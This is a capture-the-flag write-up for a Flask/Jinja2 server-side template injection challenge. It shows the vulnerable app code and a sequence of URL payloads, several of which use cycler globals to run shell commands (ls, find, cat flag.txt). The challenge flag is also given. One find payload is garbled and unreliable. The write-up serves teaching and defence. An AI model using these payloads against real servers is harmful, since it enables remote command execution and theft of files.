### Garfield Fun – Server Side Template Injection (SSTI) Exploitation
 **CTF:** USC CTF  
 **Challenge:** garfield-fun  
 **Category:** Web  
 **Points:** 100 

### Description:
 what is server side template injection? can you use it to get garfields secret?
 
 garfield-fun.challenge.uscctf.org 
 
 Downloads: app.py

### Below is the simplified version of SSTI
  
    Server-Side Template Injection (SSTI) is a vulnerability that happens when a website takes user input and directly uses it inside a template without treating it as plain text. 
    
    Templates are used by web applications to generate HTML pages. 
    Some common template engines are Jinja2 (Python/Flask), Twig (PHP),etc. 
    These engines can evaluate expressions written inside special syntax like {{ ... }}.
    
    If user input is inserted into the template and then rendered, the server may execute that input as code instead of displaying it.
    for example: {{ 7*7 }} is added to the url, Instead of showing "{{7*7}}" as text, the server evaluates it and returns: 49
    
    This confirms that the input is being executed on the server, which means Server Side Template Injection exists.

   ### Initial Approach

   I started by [reading](https://medium.com/@Fcmam5/ctf-as-a-developer-pt-1-template-engines-ssti-b03c59e2c095) about Server-Side Template Injection (SSTI) 
   
   After that, I looked into the app.py given in the challenge. 
  ```python
  from flask import Flask, request, render_template_string, render_template

  app = Flask(__name__)
  
  @app.route('/')
  def function():
      return render_template('home.html')
  
  @app.route('/mylabs', methods=['GET'])
  def index():
      words = [
          request.args.get(f'word_{i}', "")
          for i in range(1, 17)
      ]
          
      template_string = '''
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Document</title>
      <link rel="stylesheet" href="../static/style2.css">
      <script src="../static/script2.js"></script>
  </head>
  <body>
      <h1>Your Garfield Lasagna Monday Madlib</h1>
      <p>
          Once upon a time, in a {} land, Garfield and his trusty {}
          set out to {} on a(n) {} adventure. 
          Garfield was feeling {} about the prospect of finding a treasure trove of {}!
          
          They {} to the secret location, and to their amazement, they found a {}
          chest filled with {}. Garfield couldn't resist {} into the delicious treat!
          
          Filled with {}, Garfield decided to {} all the way back home with the treasure chest. 
          He proudly displayed it in his {} and invited all his {} friends to join the celebration. 
          They {} and danced around the chest, having a fantastic {}.       
      </p>
  </body>
  </html>
  '''.format(*words)
      return render_template_string(template_string)
  
  if __name__ == '__main__':
      app.run(debug=True)
  ```

 I noticed that user input (word_1 to word_16) is inserted into a template using .format() and then rendered using                       render_template_string(). This made me suspect **SSTI**.

 ### Confirming SSTI
 [The challenege website](https://garfield-fun.challenge.uscctf.org)
 ![Garfield Fun](../assets/Garfield_1.png)

    Payload:/mylabs?word_5={{7*7}}
 ![SSTI_Confirmed](../assets/Garfield_1.png)
 
    Output: Observe the 49 in the image above.
    This confirms that SSTI exists.

 ---
 ### Exploring the Environment
    Payload:/mylabs?word_5={{config}}
 ![Config output](../assets/Garfield_2.png)
 
    This showed the Flask config object, but SECRET_KEY was None, so it was not useful.

 ---

 ### Listing Files

    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
 ![ls output](../assets/Garfield_3.png)

 ---

 ### Searching for the Flag

    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}

 ![find output](../assets/Garfield_4.png)

    This revealed the presence of flag.txt.

 ---

 ### Reading the Flag
    Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
 ![flag output](../assets/Garfield_5.png)

 ---

 ### Flag

    uscctf{ssti_rules_mwahaha}

 ---

 ### Why SSTI is Dangerous

    SSTI can allow attackers to:
    
    - Access application configuration  
    - Read sensitive files  
    - Access environment variables  
    - Execute system commands  
    
    In this challenge, it allowed command execution and reading the flag file.
    
 ---

 ### Root Cause

    The vulnerability exists because:
    
    1. User input is inserted into a string using .format()  
    2. The string is passed to render_template_string()  
    3. The template engine executes anything inside {{ }}  
    
    This means user input is treated as code.
    
 ---

 ### Final Thought

This challenge shows how dangerous it is to render user-controlled input inside templates. Even a small mistake can lead to full server compromise.  
